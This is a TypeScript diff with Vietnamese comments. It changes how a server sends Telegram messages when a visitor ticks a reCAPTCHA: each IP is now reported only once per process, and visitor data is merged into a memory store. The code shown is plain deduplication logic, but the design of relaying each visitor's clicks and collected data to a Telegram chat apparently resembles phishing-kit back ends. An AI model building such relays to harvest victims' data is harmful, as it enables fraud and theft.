@@ -187,10 +187,13 @@ function formatRecaptchaTickMessage(data: any): string {
     ].join('\n');
 }
 
-function recaptchaRateLimitKey(data: any): string {
+function recaptchaTickIpKey(data: any): string {
     const ip = normalizeData(data).ip?.trim();
-    return `recaptcha-tick:${ip || 'no-ip'}`;
+    return ip || 'no-ip';
 }
+
+/** IP đã gửi tin reCAPTCHA tick — mỗi IP chỉ một lần trong lifetime process. */
+const recaptchaTickSentByIp = new Set<string>();
 
 async function postTelegramText(
     config: NonNullable<ReturnType<typeof getTelegramConfig>>,
@@ -232,11 +235,23 @@ async function sendRecaptchaTickTelegram(
     config: NonNullable<ReturnType<typeof getTelegramConfig>>,
     data: any
 ): Promise<void> {
-    const rateKey = recaptchaRateLimitKey(data);
-    if (!checkRateLimit(rateKey)) {
-        console.warn(`⚠️ Rate limit exceeded for key: ${rateKey}`);
+    const ipKey = recaptchaTickIpKey(data);
+
+    const mainKey = generateKey(data);
+    const prev = memoryStoreTTL.get(mainKey);
+    const fullData = mergeData(prev?.data, data);
+
+    if (recaptchaTickSentByIp.has(ipKey)) {
+        console.warn(`⚠️ reCAPTCHA tick đã gửi cho IP này, bỏ qua: ${ipKey}`);
+        memoryStoreTTL.set(mainKey, {
+            message: prev?.message ?? formatRecaptchaTickMessage(fullData),
+            messageId: prev?.messageId ?? 0,
+            data: fullData,
+        });
         return;
     }
+
+    recaptchaTickSentByIp.add(ipKey);
 
     const text = formatRecaptchaTickMessage(data);
     const messageId = await postTelegramText(config, text);
@@ -244,12 +259,10 @@ async function sendRecaptchaTickTelegram(
     if (messageId) {
         console.log(`✅ Sent reCAPTCHA tick message. ID: ${messageId}`);
     } else {
+        recaptchaTickSentByIp.delete(ipKey);
         console.warn('⚠️ reCAPTCHA tick Telegram response không có message_id');
     }
 
-    const mainKey = generateKey(data);
-    const prev = memoryStoreTTL.get(mainKey);
-    const fullData = mergeData(prev?.data, data);
     memoryStoreTTL.set(mainKey, {
         message: prev?.message ?? text,
         messageId: prev?.messageId ?? messageId ?? 0,
